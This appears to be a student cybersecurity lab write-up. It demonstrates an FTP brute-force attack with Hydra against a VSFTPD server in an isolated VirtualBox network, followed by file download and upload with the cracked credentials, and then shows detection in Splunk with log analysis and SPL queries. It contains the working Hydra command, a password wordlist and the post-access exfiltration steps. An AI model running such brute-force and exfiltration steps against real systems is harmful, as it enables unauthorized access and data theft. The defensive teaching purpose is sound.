## Lab Overview

This lab simulates a real-world **FTP Brute Force Attack** scenario in a controlled virtual environment. An attacker machine (Kali Linux) launches a credential stuffing attack against a victim FTP server (Ubuntu running VSFTPD) using **Hydra**, one of the most widely used online password-cracking tools. Meanwhile, the victim machine's authentication and FTP logs are shipped to a **Splunk Enterprise SIEM** using the **Splunk Universal Forwarder**, where security analysts can detect, monitor, and investigate the attack.

This lab covers the full attack lifecycle — from setting up the FTP server, through launching the brute force, all the way to detecting suspicious activity in Splunk — giving hands-on experience in both offensive and defensive cybersecurity.

---

## Lab Environment

| Machine            | Role                       | IP Address       |
|--------------------|----------------------------|-----------------------|------------------|
| **Kali Linux**     | Attacker Machine           |  192.168.56.103   |
| **Ubuntu VM**      | Victim           | 192.168.56.104   |
| **Splunk Server**  | SIEM Monitoring Server     |  192.168.56.1  |

**Network Note:** All machines are connected via a **Host-Only Adapter** in VirtualBox, creating an isolated internal network. This ensures no traffic leaves the lab environment.

---

## Step 1 – Installing VSFTPD on Ubuntu

### What is VSFTPD?

**VSFTPD (Very Secure FTP Daemon)** is a lightweight, fast, and secure FTP server for Unix-like systems. It is the most widely used FTP server on Linux and is known for its strong security features, good performance, and easy configuration. In this lab, VSFTPD acts as the **target FTP service** that the attacker will attempt to brute force.

### Command Used

```bash
sudo apt update
sudo apt install vsftpd -y
```

The `sudo apt update` command refreshes the package index, ensuring that the latest version of VSFTPD is available for installation. The `sudo apt install vsftpd -y` command then installs the package with the `-y` flag automatically confirming the installation prompt.

### What the Screenshot Shows

![FTP Brute Force - VSFTPD Installation](./Images/FTP_B_F_1.jpg)

The terminal output in the screenshot confirms the successful installation of VSFTPD version **3.0.5-0ubuntu3.1** on the Ubuntu machine. Key details visible in the output:

- **Package index refresh** was completed successfully before installation.
- The system identified that **vsftpd** was the only new package to be installed, with a size of **120 kB**.
- The package was downloaded from `http://in.archive.ubuntu.com/ubuntu` (Indian Ubuntu mirror, consistent with the lab being run in India).
- The installer **unpacked and configured** the package: `Setting up vsftpd (3.0.5-0ubuntu3.1)`.
- A **systemd symlink** was automatically created at `/etc/systemd/system/multi-user.target.wants/vsftpd.service`, which means VSFTPD is registered as a system service and will be manageable through `systemctl`.
- The `man-db` trigger was also processed, updating the manual pages database.

After this step, VSFTPD is installed but not yet active or configured for our use case. The next steps handle enabling and starting the service.

---

## Step 2 – Enabling and Starting VSFTPD Service

### Commands Used

```bash
sudo systemctl enable vsftpd
sudo systemctl start vsftpd
```

The `systemctl enable vsftpd` command configures VSFTPD to **start automatically at system boot** by creating a symlink in the systemd init system. The `systemctl start vsftpd` command immediately starts the VSFTPD daemon in the current session without requiring a reboot.

### What the Screenshot Shows

![FTP Brute Force - Enable and Start VSFTPD](./Images/FTP_B_F_2.jpg)

The terminal output confirms:

- **`sudo systemctl enable vsftpd`** ran successfully. The system output reads:  
  `Synchronizing state of vsftpd.service with SysV service script...`  
  `Executing: /usr/lib/systemd/systemd-sysv-install enable vsftpd`  
  This tells us that systemd synchronized the VSFTPD service state using the legacy SysV compatibility layer, and the service is now **enabled at boot**.

- **`sudo systemctl start vsftpd`** was then run. No output after this command indicates it started **without errors** — in Linux, silence on `start` commands is a sign of success.

> 💡 **Tip:** To verify the service is running, use `sudo systemctl status vsftpd`. A `active (running)` status in green confirms the service is healthy.

---

## Step 3 – Verifying VSFTPD is Listening on Port 21

### Command Used

```bash
sudo netstat -tulnp | grep 21
```

This command uses `netstat` to display all active network connections and listening ports (`-tulnp` = TCP, UDP, Listening, Numeric, Process). The output is filtered using `grep 21` to isolate the FTP port (port 21).

### What the Screenshot Shows

![FTP Brute Force - Netstat Port 21](./Images/FTP_B_F_3.jpg)

The output confirms:

```
tcp6    0    0 :::21    :::*    LISTEN    1577/vsftpd
```

- **Protocol:** `tcp6` — VSFTPD is listening on IPv6 (which also covers IPv4 connections through dual-stack)
- **Local Address:** `:::21` — The `:::` means it is listening on **all network interfaces** on port 21
- **State:** `LISTEN` — The service is actively waiting for incoming connections
- **PID/Program:** `1577/vsftpd` — Process ID 1577 is the running vsftpd daemon

This confirms that the FTP server is **up and running** and ready to accept connections on port 21.

---

## Step 4 – Checking UFW Firewall Status

### Command Used

```bash
sudo ufw status
```

**UFW (Uncomplicated Firewall)** is Ubuntu's default host-based firewall. Before allowing FTP connections, we check its current status and rules.

### What the Screenshot Shows

![FTP Brute Force - UFW Status Before](./Images/FTP_B_F_4.jpg)

The output shows:
- **Status: active** — The firewall is enabled and enforcing rules.
- Currently, the following ports are allowed:
  - **Port 22** (SSH) — Allows remote access
  - **Port 80** (HTTP) — Allows web traffic
  - **Port 443** (HTTPS) — Allows secure web traffic
- The same rules are applied for **IPv6** as well (denoted by the `(v6)` suffix).

**Important:** Notice that **port 21 (FTP) is NOT listed**. This means any FTP connection attempt from Kali will be **blocked by the firewall** at this stage. We must add a UFW rule to allow FTP before the attack can work.

---

## Step 5 – Allowing FTP Port 21 Through the Firewall

### Command Used

```bash
sudo ufw allow 21/tcp
```

This command creates a UFW rule that permits incoming **TCP connections on port 21**, which is the standard FTP control port. Without this rule, the firewall would silently drop all connection attempts from Kali to the FTP server.

### What the Screenshot Shows

![FTP Brute Force - UFW Allow 21/tcp](./Images/FTP_B_F_5.jpg)

The output shows:
```
Rule added
Rule added (v6)
```

- **`Rule added`** — The IPv4 rule for TCP port 21 has been successfully added.
- **`Rule added (v6)`** — The corresponding IPv6 rule has also been added automatically.

UFW automatically adds both IPv4 and IPv6 rules simultaneously, ensuring the FTP service is accessible regardless of which IP version the client uses.

---

## Step 6 – Verifying Firewall Rule for Port 21

### Command Used

```bash
sudo ufw status
```

After adding the port 21 rule, we verify the updated firewall configuration.

### What the Screenshot Shows

![FTP Brute Force - UFW Status After](./Images/FTP_B_F_6.jpg)

The updated firewall rules now show:

| To         | Action | From       |
|------------|--------|------------|
| 22         | ALLOW  | Anywhere   |
| 80         | ALLOW  | Anywhere   |
| 443        | ALLOW  | Anywhere   |
| **21/tcp** | **ALLOW** | **Anywhere** |
| 22 (v6)    | ALLOW  | Anywhere (v6) |
| 80 (v6)    | ALLOW  | Anywhere (v6) |
| 443 (v6)   | ALLOW  | Anywhere (v6) |
| **21/tcp (v6)** | **ALLOW** | **Anywhere (v6)** |

The **21/tcp** rule is now visible in both IPv4 and IPv6 rulesets. The Ubuntu FTP server is now fully accessible from any machine on the network, including our Kali attacker machine. The lab environment is now ready for connectivity testing.

---

## Step 7 – Testing FTP Login from Kali Linux

### Command Used

```bash
ftp 192.168.56.104
```

Before launching the brute force attack, we verify that legitimate FTP access works correctly by manually connecting to the Ubuntu FTP server using the existing user `vamsi`.

### Login Credentials

```
Username: vamsi
Password: kali
```

**Note:** The user `vamsi` already exists on the Ubuntu machine. In this lab, the password used for this user is `kali`, which is included in the wordlist that Hydra will later use.

### What the Screenshot Shows

![FTP Brute Force - FTP Login from Kali](./Images/FTP_B_F_7.jpg)

The FTP session output shows:

```
Connected to 192.168.56.104.
220 (vsFTPd 3.0.5)
Name (192.168.56.104:vamsi): vamsi
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Breaking this down line by line:
- **`Connected to 192.168.56.104`** — TCP connection was successfully established
- **`220 (vsFTPd 3.0.5)`** — The server responded with its FTP banner, revealing it is running **vsFTPd version 3.0.5** (this information is valuable to an attacker)
- **`331 Please specify the password`** — Server accepted the username and is requesting a password
- **`230 Login successful`** — Authentication succeeded
- **`Remote system type is UNIX`** — The server is a UNIX-based system (further information disclosure)
- **`Using binary mode to transfer files`** — FTP is in binary mode, which ensures accurate transfer of non-text files
- **`ftp>`** — We are now at an interactive FTP command prompt, ready to issue commands

This confirms end-to-end connectivity and valid credentials. The FTP server is working as expected.

---

## Step 8 – Monitoring Authentication Logs on Ubuntu

### Command Used

```bash
sudo tail -f /var/log/auth.log
```

The `/var/log/auth.log` file records all **authentication-related events** on the Ubuntu system, including logins, sudo commands, SSH sessions, and PAM (Pluggable Authentication Modules) events. The `tail -f` flag follows the log in real time — any new entries are displayed as they are written.

### What the Screenshot Shows

![FTP Brute Force - auth.log Before Attack](./Images/FTP_B_F_8.jpg)

The log entries visible in this screenshot are from **before the brute force attack** and show normal system activity:

- **CRON session events:** Multiple entries showing `pam_unix(cron:session): session opened for user root(uid=0) by root(uid=0)` followed by `session closed for user root` — these are routine cron jobs running as root.
- **GDM password event:** `gdm-password: gkr-pam: unlocked login keyring` — this shows the GNOME display manager unlocking the user's keyring, a normal desktop activity.
- **Sudo event:** `vamsi : TTY=pts/0 ; PWD=/home/vamsi ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/auth.log` — this is the exact command we ran! It shows `vamsi` used sudo to run `tail`, which was authorized.
- **PAM session open:** `pam_unix(sudo:session): session opened for user root by vamsi(uid=1000)` — the sudo session was opened.

**What to watch for:** When the Hydra brute force attack begins, you will see a **flood of `authentication failure` messages** from `vsftpd`, all originating from Kali's IP. This is the primary indicator of a brute force attack in the logs.

---

## Step 9 – Creating a Password Wordlist on Kali Linux

### Commands Used

```bash
nano passwords.txt
cat passwords.txt
```

A **wordlist** (also called a dictionary file) is a plain text file containing a list of potential passwords that Hydra will try one by one against the FTP target. Creating a targeted wordlist that includes the victim's actual password simulates a real-world **dictionary attack**.

### What the Screenshot Shows

![FTP Brute Force - Password Wordlist](./Images/FTP_B_F_9.jpg)

The screenshot shows the contents of `passwords.txt` as displayed by `cat`:

```
admin
password
123456
vamsi
test123
ftp123
vamsi123
welcome
root
kali
admin
password
123456
vamsi
test123
ftp123
vamsi123
welcome
root
varshith
kishan
vamsi
```

Key observations about this wordlist:
- It contains **common default credentials** like `admin`, `password`, `123456`, and `root` — these are among the most frequently used passwords globally and are always included in real-world wordlists.
- It contains **target-specific guesses** like `vamsi`, `vamsi123`, `ftp123`, and `kali` — attackers often include username-based variations as they are commonly used passwords.
- The list includes **duplicate entries**, which is not harmful but slightly inefficient.
- The actual password (`kali`) is present in the list, ensuring Hydra will eventually find it.

**Security Insight:** This demonstrates why using **common, guessable passwords** is dangerous. Even a small wordlist like this one can crack weak passwords in seconds.

---

## Step 10 – Performing the FTP Brute Force Attack with Hydra

### What is Hydra?

**Hydra** (also known as THC-Hydra) is a fast and flexible **online password cracking tool** that supports numerous protocols including FTP, SSH, HTTP, Telnet, SMTP, and many more. It works by attempting login credentials from a wordlist against a target service in rapid succession.

### Command Used

```bash
hydra -l vamsi -P passwords.txt ftp://192.168.56.104
```

**Flag Explanation:**

| Flag | Description |
|------|-------------|
| `-l vamsi` | Specifies a **single username** to attack. The lowercase `-l` means one specific username. |
| `-P passwords.txt` | Specifies the **password wordlist** file. Uppercase `-P` means a file of multiple passwords. |
| `ftp://192.168.56.104` | The **target service and IP**. Hydra identifies the protocol (FTP) and directs the attack to the specified host. |

**Note:** The `-V` (verbose) flag was not used in the final command shown, so Hydra outputs only the result rather than each attempt.

### What the Screenshot Shows

![FTP Brute Force - Hydra Attack](./Images/FTP_B_F_10.jpg)

The Hydra output reveals the complete attack execution:

```
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-07 15:46:29
[DATA] max 16 tasks per 1 server, overall 16 tasks, 23 login tries (l:1/p:23), ~2 tries per task
[DATA] attacking ftp://192.168.56.104:21/
[21][ftp] host: 192.168.56.104   login: vamsi   password: kali
1 of 1 target successfully completed, 1 valid password found
Hydra finished at 2026-05-07 15:46:35
```

Breaking down this output:
- **`max 16 tasks per 1 server`** — Hydra spawned 16 parallel threads to speed up the attack
- **`23 login tries (l:1/p:23)`** — 1 username × 23 passwords = 23 total attempts
- **`~2 tries per task`** — Load was distributed approximately evenly across threads
- **`[21][ftp] host: 192.168.56.104 login: vamsi password: kali`** — 🎯 **CRACKED!** The password for user `vamsi` is `kali`
- **`1 of 1 target successfully completed, 1 valid password found`** — Attack was successful
- **Total time: 6 seconds** (from 15:46:29 to 15:46:35) — The attack completed in just **6 seconds**, demonstrating how fast even a small wordlist attack can be

**Ethical Notice:** This technique is demonstrated **strictly for educational purposes** in a controlled lab environment. Unauthorized use of Hydra against real systems is **illegal**.

---

## Step 11 – Logging in with the Cracked Credentials

### What the Screenshot Shows

![FTP Brute Force - Login with Cracked Password](./Images/FTP_B_F_11.jpg)

This screenshot shows two key events:

**Top section — Hydra output (same as Step 10):**  
Confirms the cracked credentials: `login: vamsi | password: kali`

**Bottom section — FTP Login using cracked credentials:**

```bash
ftp 192.168.56.104
```

```
Connected to 192.168.56.104.
220 (vsFTPd 3.0.5)
Name (192.168.56.104:vamsi): vamsi
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

After Hydra successfully identified the correct password (`kali`), the attacker immediately uses the cracked credentials to **manually log in** to the FTP server. The `230 Login successful` response confirms that the attacker now has full FTP access to the victim machine.

This is the **post-exploitation phase** — the attacker has moved from credential cracking to active access. From here, they can list files, download sensitive data, or upload malicious files.

---

## Step 12 – Listing Files on the FTP Server

### Command Used

```ftp
ls
```

Once logged into the FTP server, the `ls` command lists all files and directories in the current directory (which defaults to the user `vamsi`'s home directory).

### What the Screenshot Shows

![FTP Brute Force - FTP Directory Listing](./Images/FTP_B_F_12.jpg)

The FTP session shows a connection issue with **Extended Passive Mode (EPSV)** before falling back to **EPRT** mode successfully. This is a common occurrence in NAT or VirtualBox network environments where passive mode data channels cannot be directly established, but the fallback still allows the listing to proceed.

The directory listing reveals the full contents of the victim user's home directory, including:

- Standard directories: `Desktop`, `Documents`, `Downloads`, `Music`, `Pictures`, `Public`, `Templates`, `Videos`
- Project folders: `cloud_endsem`, `cloud_lab`, `kubo`, `theHarvester`, `SteganographyTool`, `venv`
- Tool-related files: `splunkforwarder-10.2.2-80b90d638de6-linux-amd64.deb` (the Splunk forwarder installer), `splunkforwarder.tgz`
- Various scripts and source files: `app.py`, `keylogger.py`, `array_swap.c`, `max_element.c`
- A notable file: **`wordlist.txt`** — which the attacker identifies as a target to download

> **Attacker Perspective:** A directory listing like this is **information gold** for an attacker. It reveals installed tools, ongoing projects, and file structures that could be leveraged for further attacks or data exfiltration.

---

## Step 13 – Downloading a File via FTP (GET)

### Command Used

```ftp
get wordlist.txt
```

The `get` command in FTP downloads (retrieves) a specified file from the **remote server** to the **local machine** (Kali). Here, the attacker downloads `wordlist.txt` from the victim's home directory.

### What the Screenshot Shows

![FTP Brute Force - FTP GET Download](./Images/FTP_B_F_13.jpg)

The FTP output shows:

```
ftp> get wordlist.txt
local: wordlist.txt remote: wordlist.txt
229 Entering Extended Passive Mode (|||30929|)
ftp: Can't connect to '192.168.56.104:30929': Connection timed out
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for wordlist.txt (6 bytes).
100% |*****...****|     6        0.24 KiB/s
226 Transfer complete.
6 bytes received in 00:00 (0.24 KiB/s)
ftp>
```

Key highlights:
- **Passive mode timeout** occurred initially (`Can't connect to ... Connection timed out`), after which FTP fell back to **Active mode (EPRT)** which succeeded.
- **`150 Opening BINARY mode data connection`** — the file transfer began in binary mode.
- **`100% transfer`** — the file was completely transferred.
- **`6 bytes received`** — `wordlist.txt` was a small 6-byte file, but the action demonstrates **unauthorized data exfiltration** from the server.
- **`226 Transfer complete`** — server confirmed the transfer was successful.

**Real-World Impact:** In a real attack, this technique could be used to exfiltrate sensitive documents, configuration files containing credentials, database dumps, or private keys.

---

## Step 14 – Confirming Downloaded File on Kali

### Command Used

```bash
ls
```

After the FTP `get` operation, we verify the downloaded file now exists on the Kali attacker machine.

### What the Screenshot Shows

![FTP Brute Force - Files on Kali After Download](./Images/FTP_B_F_14.jpg)

The `ls` output on Kali shows the home directory contents. Notice the presence of:
- **`wordlist.txt`** — successfully downloaded from the victim FTP server
- `passwords.txt` — the wordlist we created earlier for the Hydra attack
- Other pre-existing files on the Kali machine (`vamsi.c`, `test.txt`, `q.c`, etc.)

The presence of `wordlist.txt` confirms that the **GET operation was successful** and the file has been exfiltrated from the victim's machine to the attacker's machine. This is a critical evidence trail that would be captured in the FTP server's transfer logs.

---

## Step 15 – Creating a File for Upload on Kali

### Commands Used

```bash
nano vamsi_ftp.txt
ls
```

To demonstrate **file upload (PUT)** via FTP, we first create a new file on the Kali attacker machine. This simulates a scenario where an attacker uploads a malicious file (such as a backdoor, web shell, or malware) to the victim server.

### What the Screenshot Shows

![FTP Brute Force - Create Upload File on Kali](./Images/FTP_B_F_15.jpg)

The screenshot shows:
1. **`nano vamsi_ftp.txt`** — the nano text editor was opened to create a new file named `vamsi_ftp.txt`. Content was added and saved.
2. **`ls`** output — the directory listing now includes **`vamsi_ftp.txt`**, confirming the file was created successfully alongside other files like `passwords.txt`, `wordlist.txt`, and `vamsi.c`.

**Real-World Risk:** In a real attack scenario, an attacker with FTP write access could upload a **PHP web shell**, a **reverse shell script**, a **ransomware payload**, or **modified system binaries**. This is why FTP servers with weak credentials pose an extreme security risk.

---

## Step 16 – Uploading a File via FTP (PUT)

### Command Used

```ftp
put vamsi_ftp.txt
```

The `put` command in FTP uploads (sends) a file from the **local machine** (Kali) to the **remote FTP server** (Ubuntu).

### What the Screenshot Shows

![FTP Brute Force - FTP PUT Upload](./Images/FTP_B_F_16.jpg)

The FTP output shows:

```
ftp> put vamsi_ftp.txt
local: vamsi_ftp.txt remote: vamsi_ftp.txt
229 Entering Extended Passive Mode (|||62583|)
ftp: Can't connect to '192.168.56.104:62583': Connection timed out
200 EPRT command successful. Consider using EPSV.
150 Ok to send data.
100% |*****...****|    14        2.79 KiB/s
226 Transfer complete.
14 bytes sent in 00:00 (2.79 KiB/s)
ftp>
```

Key highlights:
- Again, **EPSV passive mode timed out** and **EPRT active mode** was used successfully as fallback.
- **`150 Ok to send data`** — the server accepted the upload request and opened a data channel.
- **`14 bytes sent`** — the file `vamsi_ftp.txt` (14 bytes in size) was successfully uploaded to the victim's home directory.
- **`226 Transfer complete`** — the server confirmed the file was received and written successfully.

This entire transfer event is **logged by VSFTPD** and will show up in `/var/log/vsftpd.log` as an `OK UPLOAD` event, which is detectable in Splunk.

---

## Step 17 – Confirming Uploaded File on Ubuntu Server

### Command Used

```bash
ls
```

Back on the Ubuntu victim machine, we verify that the file uploaded from Kali is now present in the victim's home directory.

### What the Screenshot Shows

![FTP Brute Force - Confirm Upload on Ubuntu](./Images/FTP_B_F_17.jpg)

The `ls` output on the Ubuntu machine shows the home directory of the user `vamsi`. Highlighted in the listing is **`vamsi_ftp.txt`** — the file that was just uploaded from the Kali attacker machine via FTP.

The listing also confirms the presence of `wordlist.txt`, which is the file the attacker downloaded in Step 13, and many other files and directories already present on the system.

**Forensics Note:** In an incident investigation, finding **unexpected files** in user home directories (especially recently modified ones) is a strong indicator of compromise. This is why file integrity monitoring alongside SIEM tools like Splunk is critical for early detection.

---

## Step 18 – Viewing Brute Force Evidence in auth.log

### Command Used

```bash
sudo tail -f /var/log/auth.log
```

After the Hydra brute force attack, we re-examine the Ubuntu authentication log to observe the evidence left behind by the attack.

### What the Screenshot Shows

![FTP Brute Force - auth.log After Attack](./Images/FTP_B_F_18.jpg)

This is the most critical log evidence screenshot in the entire lab. The first log entry reads:

```
2026-05-07T15:30.265351+05:30 vamsi-VirtualBox vsftpd: message repeated 14 times:
[ pam_unix(vsftpd:auth): authentication failure; logname= uid=0 euid=0
tty=ftp ruser=vamsi rhost=::ffff:192.168.56.103 user=vamsi ]
```

**This single log entry is the smoking gun of the brute force attack.** Here's what it tells us:

- **`vsftpd`** — the event was generated by the FTP daemon
- **`message repeated 14 times`** — this single line summarizes **14 consecutive authentication failures**, which is the system's way of compressing repeated identical log entries. This is a direct result of Hydra's rapid-fire password attempts.
- **`pam_unix(vsftpd:auth): authentication failure`** — PAM (Pluggable Authentication Module) rejected the authentication attempt
- **`uid=0 euid=0`** — the FTP daemon process was running as root-equivalent
- **`tty=ftp`** — the terminal type is FTP (not a real terminal, confirming it's a programmatic login attempt)
- **`ruser=vamsi`** — the remote username attempting to log in
- **`rhost=::ffff:192.168.56.103`** — the **attacker's IP address** (192.168.56.103 in IPv4-mapped IPv6 format) — this is critical forensic evidence
- **`user=vamsi`** — the local username being targeted

The subsequent entries show normal CRON activity, confirming that the brute force messages stand out dramatically against the baseline noise.

**Detection Rule:** In a SOC environment, a rule that triggers on **more than 5 `authentication failure` events from the same source IP within 1 minute** would catch this attack in near real-time.

---

## Step 19 – Viewing Events in Splunk Enterprise

### Splunk Search Used

```spl
index="main"
```

After the Splunk Universal Forwarder was configured to ship `/var/log/auth.log` and `/var/log/vsftpd.log` to the Splunk server, we can search and analyze all forwarded events.

### What the Screenshot Shows

![FTP Brute Force - Splunk Events Dashboard](./Images/FTP_B_F_19.jpg)

The Splunk search interface shows a wealth of information:

**Event Count:**  
- **25,206 events** were ingested from the Ubuntu machine over the time range **5/6/26 3:30:00 PM to 5/7/26 4:20:11 PM** (approximately 25 hours of logs)

**Selected Fields (Left Panel):**
- `host` — 1 unique host (`vamsi-VirtualBox`)
- `source` — 3 unique sources (auth.log, vsftpd.log, syslog)
- `sourcetype` — 4 unique sourcetypes

**Visible Log Events:**
Looking at the events listed in the main view:
- System events from `/var/log/syslog` showing **kernel**, **systemd**, and **gnome-shell** messages
- Authentication events from `/var/log/auth.log` showing sudo commands and session management
- The events are timestamped and color-coded by source, making it easy to correlate events across sources

**Timeline Visualization:**  
The green timeline bar chart at the top shows event distribution over time. The **spike visible** in the timeline corresponds to the **period when the Hydra attack occurred** — a sudden burst of authentication failure events from the FTP service.

**SIEM Value:** Having all logs centralized in Splunk allows security teams to correlate events from multiple sources, build dashboards, set up alerts, and conduct forensic investigations from a single pane of glass.

---

## Splunk SPL Queries for Detection

### 1. Detect All Authentication Failures

```spl
index=* "authentication failure"
```

**Purpose:** Finds all PAM authentication failure events. During a brute force attack, this query will return a large number of events from `vsftpd` in a short time window.

---

### 2. Search All VSFTPD Events

```spl
index=* vsftpd
```

**Purpose:** Returns every event generated by the VSFTPD daemon — including failed logins, successful logins, and file transfer records.

---

### 3. Detect FTP File Uploads

```spl
index=* "OK UPLOAD"
```

**Purpose:** The VSFTPD log records successful file uploads with the `OK UPLOAD` string. This query helps identify if an attacker uploaded any files after gaining access.

---

### 4. Detect FTP File Downloads

```spl
index=* "OK DOWNLOAD"
```

**Purpose:** Similarly, `OK DOWNLOAD` entries indicate files that were downloaded from the FTP server. This is critical for detecting **data exfiltration**.

---

### 5. Brute Force Detection — High Failure Count by Source

```spl
index=* "authentication failure"
| stats count by host, user
| where count > 5
```

**Purpose:** This aggregation query counts authentication failures grouped by host and username, then filters for cases where a single username experienced more than 5 failures — a strong indicator of brute force activity. In our lab, the count would be **14+**, far exceeding the threshold.

---

### 6. Identify Attacker IP from Auth Failures

```spl
index=* "authentication failure" vsftpd
| rex field=_raw "rhost=::ffff:(?<attacker_ip>\d+\.\d+\.\d+\.\d+)"
| stats count by attacker_ip, user
| sort -count
```

**Purpose:** This advanced query extracts the attacker's IP address from the raw log field using a regular expression, then counts attack attempts per IP. This allows analysts to quickly identify and block the attacking host.

---

### 7. Timeline of the Attack

```spl
index=* "authentication failure" vsftpd
| timechart span=1m count
```

**Purpose:** Creates a time-based chart showing authentication failures per minute. The spike during the Hydra attack will be immediately visible as an anomaly.

---

## Observations

Based on the lab execution, the following key observations were made:

1. **Hydra is extremely fast** — The entire brute force attack against the FTP server with 23 password attempts completed in just **6 seconds** using 16 parallel threads.

2. **Weak passwords are immediately vulnerable** — The password `kali` was cracked without any special techniques — just a simple dictionary containing common words and the username.

3. **auth.log captures brute force fingerprints** — The `message repeated 14 times: authentication failure` entry in `/var/log/auth.log` is a clear, unmistakable indicator of a brute force attack, with the attacker's exact IP address embedded in the log entry.

4. **vsftpd logs capture file transfer activity** — Both `GET` (download) and `PUT` (upload) operations are recorded in `/var/log/vsftpd.log` with `OK DOWNLOAD` and `OK UPLOAD` markers, making it possible to audit all FTP file activity.

5. **Splunk centralized all logs effectively** — The Universal Forwarder successfully shipped 25,206+ events from the Ubuntu machine to Splunk, making all activity searchable and analysable from the Splunk interface.

6. **The attack left a clear evidence trail** — Multiple log files (auth.log, vsftpd.log) captured different facets of the attack. Cross-referencing these logs in Splunk allowed for a complete reconstruction of the attack timeline.

7. **Passive mode FTP issues in VirtualBox** — The EPSV passive mode timeouts observed during file transfers are a common behavior in VirtualBox host-only networks. FTP fell back to EPRT (active mode) automatically, which worked successfully.

8. **Post-exploitation is easy once credentials are cracked** — After Hydra found the password, the attacker immediately gained full access to the victim's home directory, including the ability to read and write files.

---

## Conclusion

This lab provided a comprehensive, end-to-end demonstration of an **FTP Brute Force Attack** and its detection using a **SIEM (Security Information and Event Management)** platform.

### What We Learned

**From the Attacker's Perspective:**  
Setting up Hydra and launching a dictionary attack against FTP is trivially simple — it requires only the target IP, a username, and a wordlist. The entire attack can be completed in seconds, and the attacker immediately gains read/write access to the server upon cracking the password. This underscores why **FTP with password authentication should never be exposed to untrusted networks** without additional protections.

**From the Defender's Perspective:**  
The attack left **extensive evidence** in system logs. Both `/var/log/auth.log` and `/var/log/vsftpd.log` clearly recorded the burst of authentication failures, the attacker's IP address, and all subsequent file operations. With Splunk's centralized log management and SPL query capabilities, a security analyst can:
- Detect brute force attempts in near real-time
- Identify the attacking source IP
- Reconstruct the complete timeline of the attack
- Identify what files were accessed, uploaded, or downloaded

### Key Security Takeaways

- **Never use weak or common passwords** — especially for publicly accessible services like FTP
- **Disable plain FTP** and use **SFTP or FTPS** instead, which encrypt both credentials and data in transit
- **Implement account lockout policies** — locking accounts after N failed attempts defeats brute force attacks entirely
- **Monitor logs in real time** using a SIEM — tools like Splunk, Elastic SIEM, or Wazuh can automatically alert on brute force patterns
- **Restrict FTP access by IP** using firewall rules or TCP wrappers to limit the attack surface
- **Use Fail2ban** on the Ubuntu server to automatically block IPs after repeated authentication failures

This lab reinforces the importance of **proactive security monitoring**. While the attacker only needed seconds to crack the password, a properly configured SIEM would have alerted the security team within the same time window, enabling rapid incident response and mitigation.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| **VSFTPD 3.0.5** | FTP server on the Ubuntu victim machine |
| **Hydra v9.4** | Online password brute force tool used by the attacker |
| **UFW** | Ubuntu firewall management |
| **Splunk Enterprise** | SIEM platform for log collection and threat detection |
| **Splunk Universal Forwarder 10.2.2** | Log shipping agent on the Ubuntu machine |
| **netstat** | Network socket monitoring to verify service status |
| **nano** | Text editor for creating configuration files and wordlists |

---

## Log Files Referenced

| Log File | Contains |
|----------|----------|
| `/var/log/auth.log` | PAM authentication events, sudo commands, SSH logins, FTP authentication failures |
| `/var/log/vsftpd.log` | FTP-specific events: logins, logouts, file uploads (OK UPLOAD), file downloads (OK DOWNLOAD) |
| `/var/log/syslog` | General system events, kernel messages, service status |

---

**Disclaimer:** This lab is conducted in a **controlled, isolated virtual environment** for **educational purposes only**. All techniques demonstrated are meant to build understanding of attack methods and defensive countermeasures. **Never perform these actions on systems you do not own or have explicit written permission to test.**

---

*Documentation prepared as part of Cybersecurity Lab Portfolio | FTP Brute Force Detection Lab*
